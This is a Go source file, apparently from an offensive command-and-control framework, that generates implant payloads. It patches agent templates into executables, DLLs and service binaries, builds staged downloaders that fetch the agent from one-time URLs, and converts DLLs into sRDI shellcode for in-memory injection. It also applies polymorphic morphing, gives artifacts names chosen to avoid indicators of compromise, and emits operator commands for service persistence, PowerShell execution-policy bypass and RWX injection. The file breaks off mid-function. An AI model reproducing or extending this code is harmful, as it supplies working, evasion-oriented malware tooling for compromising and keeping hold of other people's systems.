// Package payload implements zero-compile generation (plan §4): read a
// pre-built template, overwrite the sentinel slot, write the artifact.
package payload

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"time"

	"wispp/protocol"
	"wispp/server/internal/poly"
	"wispp/server/internal/srdi"
	"wispp/server/internal/stage"
)

// Spec is the generation request from the console.
type Spec struct {
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	Staged    bool      `json:"staged"`
	RSStaged  bool      `json:"rs_staged,omitempty"` // layered rust stager+loader+core (windows_amd64)
	Agent     string    `json:"agent,omitempty"`     // go | rust (default: go, or rust with rs_staged)
	Format    string    `json:"format,omitempty"`    // exe (P0); dll/svc/shellcode/script are planned
	Delivery  string    `json:"delivery,omitempty"`  // direct | subprocess | staged
	Loader    string    `json:"loader,omitempty"`    // none | go | rust | c | cpp
	Profile   string    `json:"profile,omitempty"`   // P4: bound HTTP(S) profile
	Source    string    `json:"source,omitempty"`    // template (P0) | source (planned)
	Poly      *PolySpec `json:"poly,omitempty"`      // P5: encoded builds
	Listener  string    `json:"listener,omitempty"`  // listener id (default: first running http)
	Project   string    `json:"project,omitempty"`   // owning project (default: "default")
	SleepMS   int       `json:"sleep_ms"`
	JitterPct int       `json:"jitter_pct"`
	Note      string    `json:"note,omitempty"`

	// StageTTLSeconds/StageUses override the server defaults for staged and
	// layered payloads (zero = default).
	StageTTLSeconds int    `json:"stage_ttl_seconds,omitempty"`
	StageUses       int    `json:"stage_uses,omitempty"`
	StageToken      string `json:"-"` // set by Create; persisted separately
}

// Meta describes one generated artifact.
type Meta struct {
	ID       string    `json:"id"`
	Name     string    `json:"name"`
	OS       string    `json:"os"`
	Arch     string    `json:"arch"`
	Mode     string    `json:"mode"` // direct | subprocess | staged | staged-rs | staged-mem
	Agent    string    `json:"agent"`
	Format   string    `json:"format"`
	Delivery string    `json:"delivery"`
	Loader   string    `json:"loader"`
	Profile  string    `json:"profile,omitempty"`
	Source   string    `json:"source"`
	Poly     bool      `json:"poly,omitempty"`
	Hint     string    `json:"hint,omitempty"`
	SHA256   string    `json:"sha256"`
	Size     int64     `json:"size"`
	Note     string    `json:"note,omitempty"`
	Listener string    `json:"listener,omitempty"`
	Project  string    `json:"project,omitempty"`
	Path     string    `json:"-"` // disk location
	Created  time.Time `json:"created"`

	// Live stage-token state (filled by List/Resolve for staged modes).
	StageToken  string    `json:"-"`
	StageUntil  time.Time `json:"stage_until,omitempty"`
	StageLeft   int       `json:"stage_left,omitempty"`
	StageTotal  int       `json:"stage_total,omitempty"`
	StageActive bool      `json:"stage_active,omitempty"`
}

// DefaultsProvider resolves a listener id ("" = any) to agent-facing facts.
type DefaultsProvider func(listenerID string) (servers []string, uri, psk string, err error)

// ProfilesResolver resolves a stored/builtin profile by name for payload
// binding (plan P4). Returns an error for unknown names.
type ProfilesResolver func(name string) (*protocol.Profile, error)

type Service struct {
	TemplatesDir string
	PayloadsDir  string
	Stage        *stage.Service
	PluginPubkey string           // hex ed25519 baked into generated payloads
	SubmitPath   string           // agent-facing submit path from the listener profile
	Defaults     DefaultsProvider // servers are ORIGINS (scheme://host:port), no path
	Profiles     ProfilesResolver // profile binding for generated artifacts (nil = off)

	mu    sync.Mutex
	metas []Meta

	tplMu    sync.Mutex
	tplCache *Templates
}

// Platforms lists supported template triples (agent must exist; stager too).
func (s *Service) Platforms() []string {
	out := []string{}
	for _, p := range []string{
		"darwin_amd64", "darwin_arm64",
		"linux_amd64", "linux_arm64", "linux_386",
		"windows_amd64", "windows_arm64", "windows_386",
	} {
		if _, err := os.Stat(s.templatePath("agent", p)); err == nil {
			out = append(out, p)
		}
	}
	return out
}

func (s *Service) templatePath(kind, platform string) string {
	name := kind + "_" + platform
	if strings.HasPrefix(platform, "windows") {
		name += ".exe" // build_templates emits PE files with the canonical suffix
	}
	return filepath.Join(s.TemplatesDir, name)
}

// Create produces one payload. exe/dll/svc are config-patched templates; the
// staged Go path additionally embeds a one-time stage URL. script artifacts are
// text stagers that fetch the same one-time stage2.
func (s *Service) Create(spec Spec) (*Meta, error) {
	normalized, err := s.normalize(spec)
	if err != nil {
		return nil, err
	}
	spec = normalized
	if spec.Project == "" {
		spec.Project = "default"
	}
	servers, uri, psk, err := s.Defaults(spec.Listener)
	if err != nil {
		return nil, err
	}
	// Rust QUIC is feature-gated (plan P6 decision #7): direct exe/dll
	// templates carry it, the staged core does not. Reject at build time —
	// with the template's actual features — instead of shipping an agent
	// that cannot check in.
	if spec.Agent == AgentRust {
		for _, u := range servers {
			if !strings.HasPrefix(u, "quic://") {
				continue
			}
			if spec.Delivery == DeliveryStaged || spec.RSStaged {
				return nil, errors.New("payload: rust staged payloads do not carry the quic transport (use direct exe/dll or an http/tcp listener)")
			}
			if !slices.Contains(s.Templates().RS.Features, "quic") {
				return nil, errors.New("payload: rust template lacks the quic feature (rebuild rs templates with WISP_RS_FORMATS=agent,dll)")
			}
		}
	}
	if uri == "" {
		uri = "/submit"
	}
	if spec.SleepMS < protocol.MinSleepMS {
		spec.SleepMS = 5000
	}
	if spec.JitterPct < 0 || spec.JitterPct > protocol.MaxJitterPct {
		spec.JitterPct = 30
	}
	platform := spec.OS + "_" + spec.Arch
	cfg := protocol.PayloadCfg{
		Servers: servers, PSK: psk, Path: uri, PluginPubkey: s.PluginPubkey,
		SleepMS: spec.SleepMS, JitterPct: spec.JitterPct, Insecure: true,
	}
	if spec.Profile != "" {
		if s.Profiles == nil {
			return nil, errors.New("payload: profile resolver not configured")
		}
		prof, err := s.Profiles(spec.Profile)
		if err != nil {
			return nil, err
		}
		if err := prof.Validate(); err != nil {
			return nil, err
		}
		cfg.Profile = prof
	}
	switch {
	case spec.Format == FormatShellcode:
		return s.createShellcode(spec, platform, cfg)
	case spec.Format == FormatDLL && spec.Delivery == DeliverySubprocess:
		return s.createSubprocessDLL(spec, platform, cfg)
	case spec.Format == FormatScript:
		return s.createScript(spec, platform, cfg)
	case (spec.Loader == LoaderC || spec.Loader == LoaderCPP) && spec.Agent == AgentRust:
		return s.createStagedRustMapped(spec, platform, cfg)
	case spec.RSStaged:
		return s.createLayeredRust(spec, platform, cfg)
	case spec.Format == FormatDLL || spec.Format == FormatSvc || spec.Delivery == DeliveryDirect:
		return s.createDirect(spec, platform, cfg)
	}

	// stage2 content is always the fully-patched direct agent
	agentTmpl, err := os.ReadFile(s.templatePath("agent", platform))
	if err != nil {
		return nil, fmt.Errorf("no agent template for %s (run build_templates): %w", platform, err)
	}
	agentImg, err := protocol.PatchBinary(agentTmpl, cfg)
	if err != nil {
		return nil, err
	}
	stagerPath := s.templatePath("stage", platform)
	if spec.Loader == LoaderC || spec.Loader == LoaderCPP {
		stagerPath = s.loaderPath(spec.Loader)
	}
	stagerTmpl, err := os.ReadFile(stagerPath)
	if err != nil {
		return nil, fmt.Errorf("no stager template %s: %w", filepath.Base(stagerPath), err)
	}
	token, err := stage.NewToken()
	if err != nil {
		return nil, err
	}
	if err := s.Stage.IssueEx(token, agentImg, "", time.Duration(spec.StageTTLSeconds)*time.Second, spec.StageUses); err != nil {
		return nil, err
	}
	spec.StageToken = token
	stageURL := s.stageURL(servers, token)
	if stageURL == "" {
		s.Stage.Revoke(spec.StageToken)
		return nil, errors.New("payload: no listener server url available")
	}
	img, err := protocol.PatchBinary(stagerTmpl, protocol.PayloadCfg{Staged: stageURL})
	if err != nil {
		s.Stage.Revoke(spec.StageToken)
		return nil, err
	}
	ext := ""
	if spec.OS == "windows" {
		ext = ".exe"
	}
	m, err := s.record(img, spec, "staged", ext)
	if err != nil && spec.StageToken != "" {
		s.Stage.Revoke(spec.StageToken)
	}
	return m, err
}

// createDirect patches an agent template for formats that carry the config in
// their image: exe direct, DLL (Go/Rust) and the Windows service host.
func (s *Service) createDirect(spec Spec, platform string, cfg protocol.PayloadCfg) (*Meta, error) {
	var (
		tmplPath string
		ext      string
	)
	switch {
	case spec.Format == FormatDLL && spec.Agent == AgentGo:
		tmplPath = filepath.Join(s.TemplatesDir, "agent_dll_"+platform+".dll")
		ext = ".dll"
	case spec.Format == FormatDLL && spec.Agent == AgentRust:
		tmplPath = filepath.Join(s.TemplatesDir, "rs_agent_"+platform+".dll")
		ext = ".dll"
	case spec.Format == FormatSvc:
		tmplPath = s.templatePath("agent", platform)
		ext = ".exe"
	case spec.Agent == AgentRust:
		tmplPath = filepath.Join(s.TemplatesDir, rsAgentName(platform))
		if spec.OS == "windows" {
			ext = ".exe"
		}
	default:
		tmplPath = s.templatePath("agent", platform)
		if spec.OS == "windows" {
			ext = ".exe"
		}
	}
	tmpl, err := os.ReadFile(tmplPath)
	if err != nil {
		return nil, fmt.Errorf("payload: template %s missing: %w", filepath.Base(tmplPath), err)
	}
	img, err := protocol.PatchBinary(tmpl, cfg)
	if err != nil {
		return nil, err
	}
	m, err := s.record(img, spec, "direct", ext)
	if err != nil {
		return nil, err
	}
	s.attachHint(m)
	return m, nil
}

// createScript emits a one-liner downloader that fetches the agent through the
// one-time stage token (base64 rendering) and starts it detached.
func (s *Service) createScript(spec Spec, platform string, cfg protocol.PayloadCfg) (*Meta, error) {
	agentTmpl, err := os.ReadFile(s.templatePath("agent", platform))
	if err != nil {
		return nil, fmt.Errorf("no agent template for %s (run build_templates): %w", platform, err)
	}
	agentImg, err := protocol.PatchBinary(agentTmpl, cfg)
	if err != nil {
		return nil, err
	}
	token, err := stage.NewToken()
	if err != nil {
		return nil, err
	}
	if err := s.Stage.IssueEx(token, agentImg, "", time.Duration(spec.StageTTLSeconds)*time.Second, spec.StageUses); err != nil {
		return nil, err
	}
	spec.StageToken = token
	stageURL := s.stageURL(cfg.Servers, token)
	if stageURL == "" {
		s.Stage.Revoke(spec.StageToken)
		return nil, errors.New("payload: no listener server url available")
	}
	script := buildScript(spec.OS, stageURL)
	ext := ".sh"
	if spec.OS == "windows" {
		ext = ".ps1"
	}
	m, err := s.record([]byte(script), spec, "staged", ext)
	if err != nil {
		s.Stage.Revoke(spec.StageToken)
		return nil, err
	}
	s.attachHint(m)
	return m, nil
}

// createSubprocessDLL appends the config-patched DLL to a native loader. The
// loader writes it to %TEMP% at run time and starts rundll32.exe as a child —
// the OS loads the DLL normally, so Go DLLs (unsuitable for manual mapping)
// work too. No stage token is involved.
func (s *Service) createSubprocessDLL(spec Spec, platform string, cfg protocol.PayloadCfg) (*Meta, error) {
	var dllPath string
	switch spec.Agent {
	case AgentGo:
		dllPath = filepath.Join(s.TemplatesDir, "agent_dll_"+platform+".dll")
	case AgentRust:
		dllPath = filepath.Join(s.TemplatesDir, "rs_agent_"+platform+".dll")
	}
	dllTmpl, err := os.ReadFile(dllPath)
	if err != nil {
		return nil, fmt.Errorf("payload: DLL template %s missing: %w", filepath.Base(dllPath), err)
	}
	dll, err := protocol.PatchBinary(dllTmpl, cfg)
	if err != nil {
		return nil, err
	}
	loader, err := os.ReadFile(s.loaderPath(spec.Loader))
	if err != nil {
		return nil, fmt.Errorf("payload: native loader template missing: %w", err)
	}
	img := buildEmbeddedLoader(loader, dll)
	m, err := s.record(img, spec, "subprocess", ".exe")
	if err != nil {
		return nil, err
	}
	s.attachHint(m)
	return m, nil
}

// buildEmbeddedLoader appends the DLL and a 24-byte footer:
//
//	loader | pad | dll | u64 offset | u32 size | u32 flags | "WISPEMB\x01"
func buildEmbeddedLoader(loader, dll []byte) []byte {
	off := (len(loader) + 15) &^ 15
	total := off + len(dll) + EmbeddedFooterSize
	out := make([]byte, total)
	copy(out, loader)
	copy(out[off:], dll)
	at := off + len(dll)
	binary.LittleEndian.PutUint64(out[at:], uint64(off))
	binary.LittleEndian.PutUint32(out[at+8:], uint32(len(dll)))
	binary.LittleEndian.PutUint32(out[at+12:], EmbeddedFlagRundll)
	copy(out[at+16:], EmbeddedMagic)
	return out
}

// createShellcode embeds the config-patched Rust DLL in a position-independent
// sRDI bootstrap. The artifact is the agent: injecting it into a Windows x64
// process maps the DLL and enters WispStartEx without touching disk.
func (s *Service) createShellcode(spec Spec, platform string, cfg protocol.PayloadCfg) (*Meta, error) {
	dllTmpl, err := os.ReadFile(filepath.Join(s.TemplatesDir, "rs_agent_"+platform+".dll"))
	if err != nil {
		return nil, fmt.Errorf("payload: no Rust DLL template for %s (run scripts/build-rs-templates.sh): %w", platform, err)
	}
	dll, err := protocol.PatchBinary(dllTmpl, cfg)
	if err != nil {
		return nil, err
	}
	boot, err := os.ReadFile(s.srdiBootstrapPath())
	if err != nil {
		return nil, fmt.Errorf("payload: no sRDI bootstrap template (build with loaders/srdi/build.sh --install): %w", err)
	}
	img, err := srdi.Convert(boot, dll, srdi.Options{Export: "WispStartEx", ClearHeaders: true})
	if err != nil {
		return nil, fmt.Errorf("payload: srdi convert: %w", err)
	}
	m, err := s.record(img, spec, "direct", ".bin")
	if err != nil {
		return nil, err
	}
	s.attachHint(m)
	return m, nil
}

func (s *Service) stageURL(servers []string, token string) string {
	for _, u := range servers {
		if strings.HasPrefix(u, "http://") || strings.HasPrefix(u, "https://") {
			return strings.TrimRight(u, "/") + s.stagePath() + "/" + token
		}
	}
	return ""
}

// attachHint persists the operator-facing launch command (rundll32 / sc / sh).
func (s *Service) attachHint(m *Meta) {
	hint := artifactHint(*m)
	if hint == "" {
		return
	}
	m.Hint = hint
	s.mu.Lock()
	for i := range s.metas {
		if s.metas[i].ID == m.ID {
			s.metas[i].Hint = hint
		}
	}
	s.saveLocked()
	s.mu.Unlock()
}

func artifactHint(m Meta) string {
	switch m.Format {
	case FormatDLL:
		if m.Mode == "subprocess" {
			return m.Name
		}
		return "rundll32.exe " + m.Name + ",WispStart"
	case FormatSvc:
		return `sc create wisp-agent binPath= "C:\ProgramData\` + m.Name + ` --service" start= auto && sc start wisp-agent`
	case FormatScript:
		if m.OS == "windows" {
			return "powershell -NoProfile -ExecutionPolicy Bypass -File " + m.Name
		}
		return "sh " + m.Name
	case FormatShellcode:
		return "inject " + m.Name + " into a Windows x64 process as RWX shellcode"
	}
	return ""
}

// createStagedRustMapped stages the Rust agent DLL for a native loader's
// memory-map mode: the front artifact is the small C/C++ loader, stage2 is the
// config-patched DLL, and nothing but the loader ever touches disk on the
// target.
func (s *Service) createStagedRustMapped(spec Spec, platform string, cfg protocol.PayloadCfg) (*Meta, error) {
	if platform != "windows_amd64" {
		return nil, errors.New("payload: native loader memory mode is windows_amd64 only")
	}
	loaderLabel := "C"
	if spec.Loader == LoaderCPP {
		loaderLabel = "C++"
	}
	dll, err := os.ReadFile(filepath.Join(s.TemplatesDir, "rs_agent_"+platform+".dll"))
	if err != nil {
		return nil, fmt.Errorf("payload: no Rust DLL template for %s (run scripts/build-rs-templates.sh): %w", platform, err)
	}
	agentImg, err := protocol.PatchBinary(dll, cfg)
	if err != nil {
		return nil, err
	}
	token, err := stage.NewToken()
	if err != nil {
		return nil, err
	}
	if err := s.Stage.IssueEx(token, agentImg, "", time.Duration(spec.StageTTLSeconds)*time.Second, spec.StageUses); err != nil {
		return nil, err
	}
	spec.StageToken = token
	stageURL := s.stageURL(cfg.Servers, token)
	if stageURL == "" {
		s.Stage.Revoke(spec.StageToken)
		return nil, errors.New("payload: no listener server url available")
	}
	stagerTmpl, err := os.ReadFile(s.loaderPath(spec.Loader))
	if err != nil {
		s.Stage.Revoke(spec.StageToken)
		return nil, fmt.Errorf("payload: no %s loader template: %w", loaderLabel, err)
	}
	img, err := protocol.PatchBinary(stagerTmpl, protocol.PayloadCfg{Staged: stageURL})
	if err != nil {
		s.Stage.Revoke(spec.StageToken)
		return nil, err
	}
	m, err := s.record(img, spec, "staged-mem", ".exe")
	if err != nil {
		s.Stage.Revoke(spec.StageToken)
	}
	return m, err
}

// createLayeredRust produces the layered rust payload (plan §5.3): the stager
// exe carries only the stage URL; the loader DLL, the core DLL and the
// encrypted config tail all travel inside the one-time stage bundle.
func (s *Service) createLayeredRust(spec Spec, platform string, cfg protocol.PayloadCfg) (*Meta, error) {
	if platform != "windows_amd64" {
		return nil, errors.New("payload: layered rust payload is windows_amd64 only")
	}
	stager, err := os.ReadFile(filepath.Join(s.TemplatesDir, "rs_stager_windows_amd64.exe"))
	if err != nil {
		return nil, fmt.Errorf("no rs stager template (run scripts/build-rs-templates.sh): %w", err)
	}
	loader, err := os.ReadFile(filepath.Join(s.TemplatesDir, "rs_loader_windows_amd64.dll"))
	if err != nil {
		return nil, fmt.Errorf("no rs loader template (run scripts/build-rs-templates.sh): %w", err)
	}
	core, err := os.ReadFile(filepath.Join(s.TemplatesDir, "rs_core_windows_amd64.dll"))
	if err != nil {
		return nil, fmt.Errorf("no rs core template (run scripts/build-rs-templates.sh): %w", err)
	}
	cfgJSON, err := json.Marshal(cfg)
	if err != nil {
		return nil, err
	}
	token, err := stage.NewToken()
	if err != nil {
		return nil, err
	}
	bundle, err := protocol.BuildStagedBundle(loader, core, cfgJSON, token)
	if err != nil {
		return nil, err
	}
	if err := s.Stage.IssueEx(token, bundle, "", time.Duration(spec.StageTTLSeconds)*time.Second, spec.StageUses); err != nil {
		return nil, err
	}
	spec.StageToken = token
	stageURL := ""
	for _, u := range cfg.Servers {
		if strings.HasPrefix(u, "http://") || strings.HasPrefix(u, "https://") {
			stageURL = strings.TrimRight(u, "/") + s.stagePath() + "/" + token
			break
		}
	}
	if stageURL == "" {
		s.Stage.Revoke(spec.StageToken)
		return nil, errors.New("payload: no listener server url available")
	}
	img, err := protocol.PatchBinary(stager, protocol.PayloadCfg{Staged: stageURL})
	if err != nil {
		s.Stage.Revoke(spec.StageToken)
		return nil, err
	}
	m, err := s.record(img, spec, "staged-rs", ".exe")
	if err != nil {
		s.Stage.Revoke(spec.StageToken)
	}
	return m, err
}

// record writes a generated artifact and prepends its metadata.
func (s *Service) record(img []byte, spec Spec, mode, ext string) (*Meta, error) {
	if spec.Poly != nil && spec.Poly.Enabled {
		out, err := s.applyPoly(img, spec, mode)
		if err != nil {
			return nil, err
		}
		img = out
	}
	id := genID()
	name := genID() + genID()[:6] + ext // neutral artifact name (no product IOC)
	if err := os.MkdirAll(s.PayloadsDir, 0o700); err != nil {
		return nil, err
	}
	path := filepath.Join(s.PayloadsDir, name)
	sum := sha256.Sum256(img)
	if err := os.WriteFile(path, img, 0o600); err != nil {
		return nil, err
	}
	m := Meta{ID: id, Name: name, OS: spec.OS, Arch: spec.Arch, Mode: mode,
		Agent: spec.Agent, Format: spec.Format, Delivery: spec.Delivery, Loader: spec.Loader,
		Profile: spec.Profile, Source: spec.Source, Poly: spec.Poly != nil && spec.Poly.Enabled,
		SHA256: hex.EncodeToString(sum[:]), Size: int64(len(img)),
		Note: spec.Note, Listener: spec.Listener, Project: spec.Project, Path: path, Created: time.Now(),
		StageToken: spec.StageToken}
	s.mu.Lock()
	s.metas = append([]Meta{m}, s.metas...)
	s.saveLocked()
	s.mu.Unlock()
	if spec.StageToken != "" {
		mm := s.decorate(m)
		return &mm, nil
	}
	return &m, nil
}

// applyPoly applies plan-P5 polymorphism: shellcode gets wrapped in the
// decoder template, PE artifacts get safe morphing. Scripts stay as-is.
func (s *Service) applyPoly(img []byte, spec Spec, mode string) ([]byte, error) {
	opt := poly.Options{Seed: spec.Poly.Seed}
	if spec.Poly.Passes > 0 {
		opt.Passes = spec.Poly.Passes
	}
	switch spec.Format {
	case FormatShellcode:
		decoder, err := os.ReadFile(s.polyDecoderPath())
		if err != nil {
			return nil, fmt.Errorf("payload: no poly decoder template (build with loaders/poly/build.sh --install): %w", err)
		}
		return poly.EncodeShellcode(img, decoder, opt)
	case FormatEXE, FormatDLL, FormatSvc:
		// Subprocess artifacts end with the WISPEMB footer; never overlay them.
		opt.NoOverlay = mode == "subprocess"
		return poly.MorphPE(img, opt)
	default:
		return img, nil
	}
}

// Restore loads the generation history so the builder list survives a server
// restart, dropping entries whose artifact has been removed from disk.
func (s *Service) Restore() {
	b, err := os.ReadFile(s.metasPath())
	if err != nil {
		return
	}
	var disk []metaDisk
	if json.Unmarshal(b, &disk) != nil {
		return
	}
	keep := make([]Meta, 0, len(disk))
	migrated := false
	for _, d := range disk {
		m := d.Meta
		m.StageToken = d.StageToken
		// Path is intentionally absent from JSON; rebuild it from the name.
		m.Path = filepath.Join(s.PayloadsDir, m.Name)
		// Pre-project metadata belongs to the default project.
		if m.Project == "" {
			m.Project = "default"
			migrated = true
		}
		if migrateMeta(&m) {
			migrated = true
		}
		if _, err := os.Stat(m.Path); err == nil {
			keep = append(keep, m)
		}
	}
	s.mu.Lock()
	s.metas = keep
	if migrated {
		s.saveLocked()
	}
	s.mu.Unlock()
}

// migrateMeta fills v2 fields for records written before the model split. It
// reports whether anything changed so Restore only rewrites metas.json once.
func migrateMeta(m *Meta) bool {
	changed := false
	if m.Agent == "" {
		if m.Mode == "staged-rs" {
			m.Agent = AgentRust
		} else {
			m.Agent = AgentGo
		}
		changed = true
	}
	if m.Format == "" {
		m.Format = FormatEXE
		changed = true
	}
	if m.Delivery == "" {
		if m.Mode == "direct" {
			m.Delivery = DeliveryDirect
		} else {
			m.Delivery = DeliveryStaged
		}
		changed = true
	}
	if m.Loader == "" {
		switch {
		case m.Delivery == DeliveryDirect:
			m.Loader = LoaderNone
		case m.Agent == AgentRust:
			m.Loader = LoaderRust
		default:
			m.Loader = LoaderGo
		}
		changed = true
	}
	if m.Source == "" {
		m.Source = SourceTemplate
		changed = true
	}
	return changed
}

// Delete removes one artifact from history and disk.
func (s *Service) Delete(id string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	for i, m := range s.metas {
		if m.ID == id {
			s.metas = append(s.metas[:i], s.metas[i+1:]...)
			_ = os.Remove(m.Path)
			if m.StageToken != "" {
				s.Stage.Revoke(m.StageToken)
			}
			s.saveLocked()
			return nil
		}
	}
	return errors.New("payload: unknown id")
}

func (s *Service) metasPath() string {
	return filepath.Join(s.PayloadsDir, "metas.json")
}

type metaDisk struct {
	Meta
	StageToken string `json:"stage_token,omitempty"`
}

// saveLocked persists history atomically; caller holds s.mu. Stage tokens ride
// along (hidden from the API) so re-arm works after a restart.
func (s *Service) saveLocked() {
	disk := make([]metaDisk, len(s.metas))
	for i, m := range s.metas {
		disk[i] = metaDisk{Meta: m, StageToken: m.StageToken}
	}
	b, err := json.MarshalIndent(disk, "", "  ")
	if err != nil {
		return
	}
	if err := os.MkdirAll(s.PayloadsDir, 0o700); err != nil {
		return
	}
	tmp := s.metasPath() + ".tmp"
	if os.WriteFile(tmp, b, 0o600) == nil {
		_ = os.Rename(tmp, s.metasPath())
	}
}

// decorate fills live stage-token state for the console.
func (s *Service) decorate(m Meta) Meta {
	if m.StageToken == "" {
		return m
	}
	if st, ok := s.Stage.Status(m.StageToken); ok {
		m.StageUntil = st.Until
		m.StageLeft = st.Remaining
		m.StageTotal = st.Total
		m.StageActive = st.Remaining > 0 && time.Now().Before(st.Until)
	}
	return m
}

// List returns generation history with live stage-token state.
func (s *Service) List() []Meta {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]Meta, len(s.metas))
	for i, m := range s.metas {
		out[i] = s.decorate(m)
	}
	return out
}

// Resolve finds a generated artifact for download.
func (s *Service) Resolve(id string) (*Meta, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, m := range s.metas {
		if m.ID == id {
			mm := s.decorate(m)
			return &mm, nil
		}
	}
	return nil, errors.New("payload: unknown id")
}

// Rearm resets the stage allowance of an existing staged payload. The artifact
// already embeds the token, so nothing has to be re-downloaded.
func (s *Service) Rearm(id string, ttlSeconds, uses int) (*Meta, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for i := range s.metas {
		if s.metas[i].ID != id {
			continue
		}
		if s.metas[i].StageToken == "" {
			return nil, errors.New("payload: not a staged payload")
		}
		if _, err := s.Stage.Rearm(s.metas[i].StageToken, time.Duration(ttlSeconds)*time.Second, uses); err != nil {
			return nil, err
		}
		mm := s.decorate(s.metas[i])
		return &mm, nil
	}
	return nil, errors.New("payload: unknown id")
}

// ExportJSON keeps the API layer from importing encoding/json twice.
func (s *Service) ExportJSON() []byte { b, _ := json.Marshal(s.List()); return b }

func (s *Service) stagePath() string {
	if s.Stage != nil && s.Stage.Path != "" {
		return s.Stage.Path
	}
	return "/stage"
}

func shortMode(m string) string {
	switch m {
	case "staged":
		return "stg"
	case "staged-rs":
		return "rs"
	case "staged-mem":
		return "mem"
	case "subprocess":
		return "sub"
	}
	return "dir"
}

func genID() string {
	b := make([]byte, 5)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// ---- template manifest (/api/payloads/templates) --------------------------

type manifestFile struct {
	Name   string `json:"name"`
	SHA256 string `json:"sha256"`
	Size   int64  `json:"size"`
}

type manifest struct {
	Schema    int            `json:"schema,omitempty"`
	Kind      string         `json:"kind"`
	Agent     string         `json:"agent,omitempty"`
	Target    string         `json:"target,omitempty"`
	Toolchain string         `json:"toolchain,omitempty"`
	Features  []string       `json:"features,omitempty"`
	Source    string         `json:"source,omitempty"`
	Git       string         `json:"git"`
	Dirty     bool           `json:"dirty"`
	BuiltAt   time.Time      `json:"built_at"`
	Files     []manifestFile `json:"files"`
}

// TemplateFile is one verified artifact in a template set.
type TemplateFile struct {
	Name   string `json:"name"`
	SHA256 string `json:"sha256,omitempty"`
	Size   int64  `json:"size"`
	Match  bool   `json:"match"`
	Error  string `json:"error,omitempty"`
}

// TemplateSet describes one template family (Go or RS layered).
type TemplateSet struct {
	Kind      string         `json:"kind"`
	Schema    int            `json:"schema,omitempty"`
	Agent     string         `json:"agent,omitempty"`
	Toolchain string         `json:"toolchain,omitempty"`
	Features  []string       `json:"features,omitempty"`
	Source    string         `json:"source,omitempty"`
	Present   bool           `json:"present"`
	OK        bool           `json:"ok"`
	Git       string         `json:"git,omitempty"`
	Dirty     bool           `json:"dirty,omitempty"`
	BuiltAt   time.Time      `json:"built_at"`
	Files     []TemplateFile `json:"files"`
	Error     string         `json:"error,omitempty"`
}

// Templates is the builder capability projection: which platforms exist, which
// build they came from, and whether the files still match their manifest.
type Templates struct {
	Platforms   []string    `json:"platforms"`
	RSAvailable bool        `json:"rs_available"`
	StagePath   string      `json:"stage_path"`
	StageTTL    int         `json:"stage_ttl_seconds"`
	StageUses   int         `json:"stage_uses"`
	Go          TemplateSet `json:"go"`
	RS          TemplateSet `json:"rs"`
	C           TemplateSet `json:"c"`
	CPP         TemplateSet `json:"cpp"`
	SRDI        TemplateSet `json:"srdi"`
	Poly        TemplateSet `json:"poly"`
}

func platformList() []string {
	return []string{
		"darwin_amd64", "darwin_arm64",
		"linux_amd64", "linux_arm64", "linux_386",
		"windows_amd64", "windows_arm64", "windows_386",
	}
}

// rsFiles are the layered staged trio (required for staged-rs generation).
var rsFiles = []string{
	"rs_stager_windows_amd64.exe",
	"rs_loader_windows_amd64.dll",
	"rs_core_windows_amd64.dll",
}

// rsAllFiles is what the RS manifest covers: the layered trio plus the direct
// agent exe/DLL used by the Rust exe/dll formats.
var rsAllFiles = []string{
	"rs_stager_windows_amd64.exe",
	"rs_loader_windows_amd64.dll",
	"rs_core_windows_amd64.dll",
	"rs_agent_windows_amd64.exe",
	"rs_agent_windows_amd64.dll",
}

// Templates reports template build metadata (cached; templates change only
// when the operator rebuilds them and restarts the server).
func (s *Service) Templates() Templates {
	s.tplMu.Lock()
	defer s.tplMu.Unlock()
	if s.tplCache != nil {
		return *s.tplCache
	}
	t := Templates{Platforms: s.Platforms()}
	if s.Stage != nil {
		t.StagePath = s.Stage.Path
		t.StageTTL = int(s.Stage.TTL.Seconds())
		t.StageUses = s.Stage.Uses
	}
	expectedGo := make([]string, 0, 18)
	for _, p := range platformList() {
		expectedGo = append(expectedGo, "agent_"+p)
		if strings.HasPrefix(p, "windows") {
			expectedGo[len(expectedGo)-1] += ".exe"
		}
		expectedGo = append(expectedGo, "stage_"+p)
		if strings.HasPrefix(p, "windows") {
			expectedGo[len(expectedGo)-1] += ".exe"
		}
	}
	expectedGo = append(expectedGo, "agent_dll_windows_amd64.dll")
	t.Go = s.templateSet("go", "go_manifest.json", expectedGo)
	t.RS = s.templateSet("rs", "rs_manifest.json", rsAllFiles)
	t.C = s.templateSet("c", "c_manifest.json", []string{CLoaderName})
	t.CPP = s.templateSet("cpp", "cpp_manifest.json", []string{CPPLoaderName})
	t.SRDI = s.templateSet("srdi", "srdi_manifest.json", []string{SRDIBootstrapName})
	t.Poly = s.templateSet("poly", "poly_manifest.json", []string{PolyDecoderName})
	t.RSAvailable = true
	for _, name := range rsFiles {
		if _, err := os.Stat(filepath.Join(s.TemplatesDir, name)); err != nil {
			t.RSAvailable = false
			break
		}
	}
	s.tplCache = &t
	return t
}

func (s *Service) templateSet(kind, manifestName string, expected []string) TemplateSet {
	set := TemplateSet{Kind: kind}
	for _, name := range expected {
		if _, err := os.Stat(filepath.Join(s.TemplatesDir, name)); err == nil {
			set.Present = true
			break
		}
	}
	raw, err := os.ReadFile(filepath.Join(s.TemplatesDir, manifestName))
	if err != nil {
		set.Error = "manifest missing (rebuild templates)"
		return set
	}
	var mf manifest
	if err := json.Unmarshal(raw, &mf); err != nil {
		set.Error = "manifest invalid: " + err.Error()
		return set
	}
	set.Git, set.Dirty, set.BuiltAt = mf.Git, mf.Dirty, mf.BuiltAt
	set.Schema, set.Agent, set.Toolchain = mf.Schema, mf.Agent, mf.Toolchain
	set.Features, set.Source = mf.Features, mf.Source
	all := true
	for _, f := range mf.Files {
		tf := TemplateFile{Name: f.Name, SHA256: f.SHA256, Size: f.Size}
		path := filepath.Join(s.TemplatesDir, f.Name)
		st, err := os.Stat(path)
		if err != nil {
			tf.Error = "missing"
			all = false
			set.Files = append(set.Files, tf)
			continue
		}
		tf.Size = st.Size()
